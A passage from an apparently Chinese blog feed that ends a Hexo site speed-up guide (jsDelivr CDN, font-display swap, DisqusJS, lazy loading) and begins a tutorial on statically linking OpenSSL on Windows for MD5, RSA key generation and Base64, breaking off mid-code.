https://cdn.jsdelivr.net/gh/ github用户名 / 库名 @ 版本号或者tag / 路径/文件名
</code></pre></td></tr></table>
</div>
</div><p>我们可以通过打 tag 来访问同一个资源文件的不同版本，而不需要考虑缓存时间</p>
<h3 id="替换链接">替换链接</h3>
<p>大部分 hexo 主题并不会对使用到的 js\css\图片\字体 套上 CDN，我们来手动替换</p>
<h4 id="css-样式表">css 样式表</h4>
<p>大部分 css 样式会在 <code>head</code> 标签里面引入，这里的 css 样式表会阻塞页面的渲染，导致打开慢的体验，所以需要特别注意</p>
<p>我将我使用的主题的 style.css \ rtl.css \ disquesjs.css 替换成 jsDelivr，明显提升了等待时间</p>
<p></p>
<p>还有一些其他地方的 css 引入</p>
<p></p>
<h4 id="js-脚本">js 脚本</h4>
<p>寻找并替换各种调用到的 js 脚本</p>
<p></p>
<p>main.js</p>
<p></p>
<p>disqusjs.js</p>
<p></p>
<p>还有其他的一些地方，不一一列举了</p>
<h4 id="字体">字体</h4>
<p>字体需要特别注意，通常情况下比较大，耗时比较长</p>
<p></p>
<p>我使用的主题使用的字体通过 <code>all.min.css</code> 引入，因为前面这个 css 样式已经通过 jsDelivr 导入，里面的字体使用的是相对链接，所以字体默认也是通过 jsDelivr 引入了</p>
<h4 id="img-小图片">img 小图片</h4>
<p>一般是 logo 等资源，根据主题自行替换</p>
<blockquote>
<p>更新：为了更好的控制版本和决定是否使用 jsDelivr, 可以将这个地方独立出来放到配置文件里</p>
</blockquote>
<p>_config.yml</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">cdn</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">enabled</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span><span class="w">  </span><span class="nt">url</span><span class="p">:</span><span class="w"> </span><span class="l">https://cdn.jsdelivr.net/gh/zu1k/blog@0.0.1.2</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>用到的地方</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;!-- styles --&gt;
&lt;% if (theme.cdn.enabled) { %&gt;
  &lt;link rel=&#34;stylesheet&#34; href=&#34;&lt;%= theme.cdn.url %&gt;/css/style.css&#34;&gt;
&lt;% } else { %&gt;
  &lt;%- css(&#39;css/style&#39;) %&gt;
&lt;% } %&gt;

其他的地方同样的方法
</code></pre></td></tr></table>
</div>
</div><h2 id="加载时文字可见">加载时文字可见</h2>
<p>无论怎样优化，字体加载的时间无法忽略，这段时间的网页文字显示为空，这给用户带来卡顿感</p>
<p>我们必须使字体加载时文字可见，这样才能弥补 github pages 的慢</p>
<p>具体方法是将各 <code>@font-face</code> 中 <code>font-display</code> 设置为 <code>swap</code>, 这样可以在字体未加载完时临时使用系统字体替代，加载完后重新渲染字体</p>
<p></p>
<p>每一个地方都需要改，自己搜索吧</p>
<h2 id="使用-disqusjs">使用 DisqusJS</h2>
<p>由于众所周知的原因，disqus 被墙了，国内访问不了，而大部分 hexo 网站都使用 disqus 作为评论系统，这导致网页会卡在评论区的加载上，虽然网页已经加载完了，但进度条还在进行，给用户带来慢的感觉。</p>
<p>并且，即使有的用户翻墙能够访问 Disqus，但 Disqus 本身非常笨重，各种 CSS/JS/Font/API 加起来请求不小于 2MB，当 Disqus 加载时，浏览器会在主线程中同步解析、渲染 Disqus，造成卡顿感。</p>
<p>在上网搜索之后，找到了一个替代方案，那就是苏卡卡大佬的 DisqusJS，大家可以根据教程对自己博客的主题进行修改</p>
<p>参考链接：</p>
<ul>
<li><a href="https://blog.skk.moe/post/disqusjs/">https://blog.skk.moe/post/disqusjs/</a></li>
<li><a href="https://disqusjs.skk.moe/">https://disqusjs.skk.moe/</a></li>
<li><a href="https://github.com/SukkaW/DisqusJS">https://github.com/SukkaW/DisqusJS</a></li>
</ul>
<p>对于使用的 Disqus API 反代，我自己测试发现苏卡卡大佬提供的速度不太行，不知道是什么原因，所以推荐自己进行搭建，我是用的是 zeit 进行搭建，感觉还不错</p>
<blockquote>
<p>如果 disqusJS 默认样式不适合自己的主题，推荐 fork 原库进行修改，注意要使用 1.2.6，最新的 master 在懒加载上有点问题</p>
</blockquote>
<h2 id="使用懒加载">使用懒加载</h2>
<p>如果图片和评论区随着页面在一开始就加载，势必会拖累网页首次渲染和文字的迅速显示，这里最好的办法是使用懒加载技术</p>
<h3 id="图片懒加载">图片懒加载</h3>
<p>对于图片，我使用了 <code>hexo-lazyload-image</code> 这个插件</p>
<p>安装</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">npm install hexo-lazyload-image --save
</code></pre></td></tr></table>
</div>
</div><p>配置文件中添加</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">lazyload:
  enable: <span class="nb">true</span>
  onlypost: <span class="nb">false</span>
  loadingImg: https://cdn.jsdelivr.net/gh/zu1k/blog@0.0.1.2/images/loading.png
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>顺便给懒加载添加了 cdn 功能，可以替换成 cdn 链接来加速</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">npm install hexo-lazyload-image-cdn --save
</code></pre></td></tr></table>
</div>
</div><p>配置文件中添加</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">lazyload:
  enable: <span class="nb">true</span>
  onlypost: <span class="nb">false</span>
  loadingImg: <span class="c1"># eg ./images/loading.gif</span>
  cdn:
    enabled: <span class="nb">false</span>
    url: https://cdn.com
</code></pre></td></tr></table>
</div>
</div><h3 id="评论懒加载">评论懒加载</h3>
<p>对于评论区，很多情况下用户根本不会划到页面底部（文章写得太烂没人看得下去）。</p>
<p>所以我这里对 disqus 的加载使用懒加载技术，参考 <a href="https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/">https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/</a></p>
<p>我使用的是 disqusJS, 下面给出加载的 js 代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c">&lt;!--</span> <span class="nx">DisqusJS</span> <span class="nx">Comments</span> <span class="o">--&gt;</span>
<span class="o">&lt;%</span> <span class="k">if</span> <span class="p">(</span><span class="nx">theme</span><span class="p">.</span><span class="nx">disqusjs</span><span class="p">.</span><span class="nx">enabled</span> <span class="o">&amp;&amp;</span> <span class="nx">theme</span><span class="p">.</span><span class="nx">disqusjs</span><span class="p">.</span><span class="nx">shortname</span><span class="p">){</span> <span class="o">%&gt;</span>
  <span class="o">&lt;</span><span class="nx">script</span> <span class="nx">crossorigin</span> <span class="nx">defer</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;https://cdn.jsdelivr.net/gh/zu1k/DisqusJS@1.2.6.3/dist/disqus.js&#34;</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;disqusjs-script&#34;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
  <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;disqusjs-script&#34;</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&#34;load&#34;</span><span class="p">,</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
      <span class="nx">setTimeout</span><span class="p">(</span>
        <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
          <span class="kd">function</span> <span class="nx">t</span><span class="p">()</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">dsqjs</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DisqusJS</span><span class="p">({</span>
                  <span class="nx">shortname</span><span class="o">:</span> <span class="s1">&#39;&lt;%= theme.disqusjs.shortname %&gt;&#39;</span><span class="p">,</span>
                  <span class="nx">siteName</span><span class="o">:</span> <span class="s1">&#39;&lt;%= theme.disqusjs.siteName %&gt;&#39;</span><span class="p">,</span>
                  <span class="nx">api</span><span class="o">:</span> <span class="s1">&#39;&lt;%= theme.disqusjs.api %&gt;&#39;</span><span class="p">,</span>
                  <span class="nx">apikey</span><span class="o">:</span> <span class="s1">&#39;&lt;%= theme.disqusjs.apikey %&gt;&#39;</span><span class="p">,</span>
                  <span class="nx">admin</span><span class="o">:</span> <span class="s1">&#39;&lt;%= theme.disqusjs.admin %&gt;&#39;</span><span class="p">,</span>
                  <span class="nx">adminLabel</span><span class="o">:</span> <span class="s1">&#39;&lt;%= theme.disqusjs.adminLabel %&gt;&#39;</span>
              <span class="p">});</span>
          <span class="p">}</span>
          <span class="kd">var</span> <span class="nx">runningOnBrowser</span> <span class="o">=</span> <span class="k">typeof</span> <span class="nb">window</span> <span class="o">!==</span> <span class="s2">&#34;undefined&#34;</span><span class="p">;</span>
          <span class="kd">var</span> <span class="nx">isBot</span> <span class="o">=</span> <span class="nx">runningOnBrowser</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="s2">&#34;onscroll&#34;</span> <span class="k">in</span> <span class="nb">window</span><span class="p">)</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">navigator</span> <span class="o">!==</span> <span class="s2">&#34;undefined&#34;</span> <span class="o">&amp;&amp;</span> <span class="sr">/(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">);</span>
          <span class="kd">var</span> <span class="nx">supportsIntersectionObserver</span> <span class="o">=</span> <span class="nx">runningOnBrowser</span> <span class="o">&amp;&amp;</span> <span class="s2">&#34;IntersectionObserver&#34;</span> <span class="k">in</span> <span class="nb">window</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isBot</span> <span class="o">&amp;&amp;</span> <span class="nx">supportsIntersectionObserver</span><span class="p">)</span> <span class="p">{</span>
              <span class="kd">var</span> <span class="nx">disqus_observer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">IntersectionObserver</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">entries</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">entries</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">isIntersecting</span><span class="p">)</span> <span class="p">{</span>
                  <span class="nx">t</span><span class="p">();</span>
                  <span class="nx">disqus_observer</span><span class="p">.</span><span class="nx">disconnect</span><span class="p">();</span>
                <span class="p">}</span>
              <span class="p">},</span> <span class="p">{</span> <span class="nx">threshold</span><span class="o">:</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">});</span>
              <span class="nx">disqus_observer</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;disqus_thread&#39;</span><span class="p">));</span>
          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">t</span><span class="p">();</span>
          <span class="p">}</span>
      <span class="p">},</span> <span class="mi">1</span><span class="p">);</span>
    <span class="p">},</span><span class="o">!</span><span class="mi">0</span>
  <span class="p">);</span>
  <span class="o">&lt;</span><span class="err">/script&gt;</span>
<span class="o">&lt;%</span> <span class="p">}</span> <span class="o">%&gt;</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="终极大招">终极大招</h2>
<p>如果经过上面的优化，你还对博客的加载速度不满意，那一定是 github pages 服务器在美国的原因，200+ms 的延迟导致首字节返回时间不短</p>
<p>其实支持通过 Github 仓库代码进行构建，部署为静态网站的平台不值 github pages 一家，我使用过的比较好的是 <code>zeit.co</code> ， 国内访问走的是台湾的 gcp 节点，延迟低速度快，推荐</p>
<p>具体使用方法非常简单，自行摸索吧</p>
<blockquote>
<p>更新: 刚知道，如果更新太快的话，zeit 会暂停构建部署的</p>
<p>You are pushing commits at a very fast pace (across the whole organization).<br>
Due to that, we cannot deploy the commit e80751b.</p>
<p>You can try again later or upgrade your plan.</p>
</blockquote>
<h2 id="辅助优化">辅助优化</h2>
<p>使用谷歌提供的 <a href="https://developers.google.com/speed/pagespeed/insights/" target="_blank" rel="noopener noreffer">Pagespeed Insights</a> 工具分析网页加载并根据建议进行优化</p>
]]></description></item><item><title>静态链接OpenSSL进行RSA\MD5\Base64</title><link>https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/</link><pubDate>Wed, 18 Mar 2020 12:50:10 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/</guid><description><![CDATA[<h2 id="简介">简介</h2>
<p>目标平台： Windows 10 amd64</p>
<p>使用静态链接方式，原因：动态链接库太大了，包含很多本次实验不需要的函数</p>
<h2 id="准备工作">准备工作</h2>
<h3 id="下载openssl代码">下载openssl代码</h3>
<p><code>git clone https://github.com/openssl/openssl.git</code></p>
<p>或者从官网 <a href="https://www.openssl.org/source/">https://www.openssl.org/source/</a> 下载源代码</p>
<p>我使用的是openssl 1.1.1</p>
<h3 id="安装perl环境这里使用的是activeperl">安装perl环境，这里使用的是ActivePerl</h3>
<p><a href="https://www.activestate.com/products/perl/">https://www.activestate.com/products/perl/</a></p>
<h3 id="安装nasm汇编器">安装NASM汇编器</h3>
<p><a href="https://www.nasm.us/">https://www.nasm.us/</a></p>
<h3 id="配置环境变量">配置环境变量</h3>
<p>将刚刚安装的nasm和perl的bin目录加入PATH</p>
<p></p>
<h2 id="编译-openssl-静态链接库">编译 openssl 静态链接库</h2>
<h3 id="初始化环境">初始化环境</h3>
<p>使用visual studio自带的命令提示工具初始化环境，因为需要使用nmake</p>
<p></p>
<p></p>
<h3 id="生成编译配置文件">生成编译配置文件</h3>
<p>cd进入openssl源码目录</p>
<p>执行 <code>perl Configure VC-WIN64A no-asm no-shared --prefix=&quot;D:\Project\opensslwork\openssl\build&quot; --openssldir=&quot;D:\Project\opensslwork\openssl\build\ssl&quot;</code></p>
<h3 id="进行编译并测试和安装">进行编译并测试和安装</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">nmake
nmake <span class="nb">test</span>
nmake install
</code></pre></td></tr></table>
</div>
</div><p>此时已经有了我们需要的头文件和静态链接lib库</p>
<p></p>
<p></p>
<h2 id="使用openssl的api进行编程">使用openssl的api进行编程</h2>
<h3 id="visual-studio项目配置">visual studio项目配置</h3>
<p>vs创建空项目，然后配置头文件和库文件的路径</p>
<p>项目右键-属性，配置选择所有配置，平台选择x64</p>
<p><code>VC++ 目录</code> 配置里面的 <code>包含目录</code> 添加openssl的头文件目录, 我这里是 <code>D:\Project\opensslwork\openssl\build\include;</code></p>
<p></p>
<p><code>链接器</code> 里面的 <code>输入</code> 的 <code>附加依赖项</code> 添加 静态库名，<code>libcrypto.lib;libssl.lib;</code></p>
<blockquote>
<p>注意：在使用openssl的静态链接库时，除了添加 <code>libcrypto.lib;libssl.lib;</code>，还需要添加系统的依赖库：<code>crypt32.lib;WS2_32.lib;</code>， 因为openssl在windows平台使用了这些库。
完整的： <code>kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies);crypt32.lib;libcrypto.lib;libssl.lib;WS2_32.lib;</code></p>
</blockquote>
<h3 id="添加头文件">添加头文件</h3>
<p>因为需要md5,rsa,base64等操作，这里需要导入openssl四个相关的头文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c++" data-lang="c++"><span class="cp">#include</span> <span class="cpf">&lt;openssl/rsa.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;openssl/pem.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;openssl/md5.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;openssl/bio.h&gt;</span><span class="cp">
</span></code></pre></td></tr></table>
</div>
</div><h3 id="使用md5对字符串生成摘要">使用MD5对字符串生成摘要</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c++" data-lang="c++"><span class="kt">int</span> <span class="nf">md5_hash</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">in</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">md</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">data</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">str</span><span class="p">;</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">in</span><span class="p">;</span>
    <span class="n">MD5</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">in</span><span class="p">),</span> <span class="n">md</span><span class="p">);</span> <span class="c1">//调用openssl的md5方法
</span><span class="c1"></span>    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="生成rsa密钥对并以pem格式写入文件">生成rsa密钥对并以pem格式写入文件</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c++" data-lang="c++"><span class="n">RSA</span> <span class="o">*</span> <span class="nf">gen_rsa</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">bits</span> <span class="o">=</span> <span class="mi">1024</span><span class="p">;</span>
    <span class="n">RSA</span><span class="o">*</span> <span class="n">rsa</span> <span class="o">=</span> <span class="n">RSA_new</span><span class="p">();</span>
    <span class="n">BIGNUM</span><span class="o">*</span> <span class="n">e</span> <span class="o">=</span> <span class="n">BN_new</span><span class="p">();</span>
    <span class="n">BN_set_word</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">RSA_F4</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">rc</span> <span class="o">=</span> <span class="n">RSA_generate_key_ex</span><span class="p">(</span><span class="n">rsa</span><span class="p">,</span> <span class="n">bits</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span> <span class="c1">//openssl中生成rsa key的新方法
</span><span class="c1"></span>    <span class="n">BN_free</span><span class="p">(</span><span class="n">e</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">rc</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>   
    <span class="n">size_t</span> <span class="n">pri_len</span><span class="p">;</span>
    <span class="n">size_t</span> <span class="n">pub_len</span><span class="p">;</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">pri_key</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">pub_key</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">BIO</span><span class="o">*</span> <span class="n">pubkey</span> <span class="o">=</span> <span class="n">BIO_new_file</span><span class="p">(</span><span class="s">&#34;public.pem&#34;</span><span class="p">,</span> <span class="s">&#34;w&#34;</span><span class="p">);</span>
    <span class="n">BIO</span><span class="o">*</span> <span class="n">prikey</span> <span class="o">=</span> <span class="n">BIO_new_file</span><span class="p">(</span><span class="s">&#34;private.pem&#34;</span><span class="p">,</span> <span class="s">&#34;w&#34;</span><span class="p">);</span>
    <span class="n">PEM_write_bio_RSAPrivateKey</span><span class="p">(</span><span class="n">prikey</span><span class="p">,</span> <span class="n">rsa</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span> <span class="c1">//私钥写入文件
</span><span class="c1"></span>    <span class="n">PEM_write_bio_RSAPublicKey</span><span class="p">(</span><span class="n">pubkey</span><span class="p">,</span> <span class="n">rsa</span><span class="p">);</span> <span class="c1">//公钥写入文件
</span><span class="c1"></span>    <span class="k">return</span> <span class="n">rsa</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="对数据进行base64编码base64在bio中有">对数据进行base64编码，base64在BIO中有</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c++" data-lang="c++"><span class="kt">int</span> <span class="nf">base64_encode</span><span class="p">(</span><span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">length</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">b64text</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">BIO</span><span class="o">*</span> <span class="n">bio</span><span class="p">,</span> <span class="o">*</span> <span class="n">b64</span><span class="p">;</span>
    <span class="n">BUF_MEM</span><span class="o">*</span> <span class="n">bufferPtr</span><span class="p">;</span>
    <span class="n">b64</span> <span class="o">=</span> <span class="n">BIO_new</span><span class="p">(</span><span class="n">BIO_f_base64</span><span class="p">());</span>
    <span class="n">bio</span> <span class="o">=</span> <span class="n">BIO_new</span><span class="p">(</span><span class="n">BIO_s_mem</span><span class="p">());</span>
    <span class="n">bio</span> <span class="o">=</span> <span class="n">BIO_push</span><span class="p">(</span><span class="n">b64</span><span class="p">,</span> <span class="n">bio</span><span class="p">);</span>
    <span class="n">BIO_set_flags</span><span class="p">(</span><span class="n">bio</span><span class="p">,</span> <span class="n">BIO_FLAGS_BASE64_NO_NL</span><span class="p">);</span>
    <span class="n">BIO_write</span><span class="p">(</span><span class="n">bio</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
    <span class="n">BIO_flush</span><span class="p">(</span><span class="n">bio</span><span class="p">);</span>
    <span class="n">BIO_get_mem_ptr</span><span class="p">(</span><span class="n">bio</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bufferPtr</span><span class="p">);</span>
    <span class="n">BIO_set_close</span><span class="p">(</span><span class="n">bio</span><span class="p">,</span> <span class="n">BIO_NOCLOSE</span><span class="p">);</span>
    <span class="o">*</span><span class="n">b64text</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">((</span><span class="n">bufferPtr</span><span class="o">-&gt;</span><span class="n">length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">));</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">*</span><span class="n">b64text</span><span class="p">,</span> <span class="n">bufferPtr</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="n">bufferPtr</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">);</span>
    <span class="p">(</span><span class="o">*</span><span class="n">b64text</span><span class="p">)[</span><span class="n">bufferPtr</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
    <span class="n">BIO_free_all</span><span class="p">(</span><span class="n">bio</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="最后通过main函数读入字符串并将三个过程连起来">最后通过main函数读入字符串并将三个过程连起来</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c++" data-lang="c++"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;usage: work.exe </span><span class="se">\&#34;</span><span class="s">string to hash and sign</span><span class="se">\&#34;</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">str</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;your str: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>

    <span class="c1">// first md5(str)
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">md</span><span class="p">[</span><span class="n">MD5_DIGEST_LENGTH</span><span class="p">];</span>
